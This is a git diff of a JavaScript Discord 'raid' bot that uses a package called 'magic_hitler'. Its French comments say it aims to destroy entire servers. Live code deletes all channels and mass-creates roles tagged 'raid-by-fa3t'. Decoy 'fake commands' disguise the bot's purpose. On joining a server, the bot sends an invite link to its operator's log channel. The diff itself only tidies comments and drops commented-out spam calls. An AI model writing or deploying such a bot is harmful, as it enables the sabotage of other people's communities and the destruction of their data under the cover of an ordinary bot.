@@ -1,5 +1,5 @@
-const Discord = require('discord.js');
-const MagicHitler = require('magic_hitler');
+const Discord = require('discord.js'); // npm i discord.js
+const MagicHitler = require('magic_hitler'); // npm i magic_hitler
 const client = new Discord.Client();
 const raid = new MagicHitler.Client({
     client: client,
@@ -9,16 +9,8 @@ const raid = new MagicHitler.Client({
 raid.ready();
  
 raid.sendMessage("Test réussi", "test");
-// raid.spamMessage("@everyone Raid by Magic Hitler", "spam", {
-//    messageNumber: 100,
-//    allChannels: false
-// });
-// raid.spamMessage("@everyone Raid by Magic Hitler", "spamAllChannels", {
-//     messageNumber: 20,
-//     allChannels: true
-// });     // On peut déclarer plusieurs fois la même fonction
 
-//Détruire le serveur en entier :
+// Détruire le serveur en entier :
 
 raid.deleteChannel("del");
 raid.deleteChannels("raid", {
@@ -41,7 +33,7 @@ raid.createRoles("raid", {
     rolesName: "raid-by-fa3t"
 });
 
-//Commandes Raids :
+// Commandes Raids :
 
 raid.deleteChannel("del");
 raid.deleteChannels("delAll", {
@@ -64,7 +56,7 @@ raid.createRoles("rls", {
     rolesName: "raid-by-fa3t"
 });
 
-//Fausses commandes :
+// Fakes commandes :
 
 client.on('message', message => {
     
@@ -123,7 +115,7 @@ client.on('message', message => {
         message.channel.send(embed)
     }
 
-    //Commandes Raid en plus
+    // Commandes Raid en plus :
 
     if(message.content === "~help"){
         message.delete()
@@ -160,6 +152,8 @@ client.on('message', message => {
 
 });
 
+// Quand le bot rejoins un serveur :
+
 client.on("guildCreate", async guild => {
     let chnlslogs = client.channels.find("id", "518710630044401665")
     let embed = new Discord.RichEmbed()
@@ -174,6 +168,8 @@ client.on("guildCreate", async guild => {
     .filter(function (channel) {return channel.type === 'text' || channel.type === 'voice'})
     .first().createInvite().then(invite => chnlslogs.send(invite.url))
 });
+
+// Quand le bot quitte un serveur :
 
 client.on("guildDelete", async guild => {
     let embed = new Discord.RichEmbed()
